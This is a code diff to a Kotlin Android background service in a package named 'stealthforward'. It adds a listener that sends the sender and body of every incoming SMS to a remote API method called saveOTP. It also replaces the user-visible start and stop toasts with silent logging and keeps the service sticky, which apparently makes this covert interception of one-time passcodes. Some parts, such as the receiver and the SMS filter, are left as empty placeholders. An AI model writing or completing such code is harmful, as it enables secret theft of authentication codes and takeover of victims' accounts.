@@ -1,68 +1,67 @@
 package com.nf.stealthforward.service
 
 import android.app.Service
+import android.content.Context
 import android.content.Intent
 import android.os.IBinder
-import android.widget.Toast
+import android.util.Log
+import com.nf.stealthforward.api.NetworkClient
+import com.nf.stealthforward.listener.SmsListener
+import retrofit2.Call
+import retrofit2.Response
 
-class BackgroundService : Service() {
+class BackgroundService : Service(), SmsListener {
 
-//    private var serviceLooper: Looper? = null
-//    private var serviceHandler: ServiceHandler? = null
-//
-//    // Handler that receives messages from the thread
-//    private inner class ServiceHandler(looper: Looper) : Handler(looper) {
-//
-//        override fun handleMessage(msg: Message) {
-//            // Normally we would do some work here, like download a file.
-//            // For our sample, we just sleep for 5 seconds.
-//            try {
-//                Thread.sleep(5000)
-//            } catch (e: InterruptedException) {
-//                // Restore interrupt status.
-//                Thread.currentThread().interrupt()
-//            }
-//
-//            // Stop the service using the startId, so that we don't stop
-//            // the service in the middle of handling another job
-//            stopSelf(msg.arg1)
-//        }
-//    }
+    companion object {
+        private val TAG = BackgroundService::class.java.simpleName
+
+        fun start(context: Context) {
+            Intent(context, BackgroundService::class.java).also { context.startService(it) }
+        }
+
+        fun stop() {
+            instance?.stopSelf()
+        }
+
+        var instance: BackgroundService? = null
+    }
 
     override fun onCreate() {
-        // Start up the thread running the service.  Note that we create a
-        // separate thread because the service normally runs in the process's
-        // main thread, which we don't want to block.  We also make it
-        // background priority so CPU-intensive work will not disrupt our UI.
-//        HandlerThread("ServiceStartArguments").apply {
-//            start()
-//
-//            // Get the HandlerThread's Looper and use it for our Handler
-//            serviceLooper = looper
-//            serviceHandler = ServiceHandler(looper)
-//        }
+        instance = this
     }
 
     override fun onStartCommand(intent: Intent, flags: Int, startId: Int): Int {
-        Toast.makeText(this, "service starting", Toast.LENGTH_SHORT).show()
-//
-//        // For each start request, send a message to start a job and deliver the
-//        // start ID so we know which request we're stopping when we finish the job
-//        serviceHandler?.obtainMessage()?.also { msg ->
-//            msg.arg1 = startId
-//            serviceHandler?.sendMessage(msg)
-//        }
-
-        // If we get killed, after returning from here, restart
+        Log.d(TAG, "background service started")
         return START_STICKY
     }
 
     override fun onBind(intent: Intent): IBinder? {
-        // We don't provide binding, so return null
         return null
     }
 
     override fun onDestroy() {
-        Toast.makeText(this, "service done", Toast.LENGTH_SHORT).show()
+        Log.d(TAG, "background service stopped")
+        instance = null
+    }
+
+    ////////////////////////////////////////////////////////////////////////////////////////////////
+
+    override fun onSmsReceived(sender: String, body: String) {
+        val receiver = "" // get from pref
+
+        // filter sms
+
+
+
+        val apiCall = NetworkClient.retrofitClient.saveOTP(receiver, sender, body)
+        apiCall.enqueue(object : retrofit2.Callback<String> {
+            override fun onFailure(call: Call<String>, t: Throwable) {
+                Log.e(TAG, "Failed to call web api. error: ${t.localizedMessage}")
+            }
+
+            override fun onResponse(call: Call<String>, response: Response<String>) {
+                Log.i(TAG, "Succeeded to call web api. response: ${response.body()}")
+            }
+        })
     }
 }
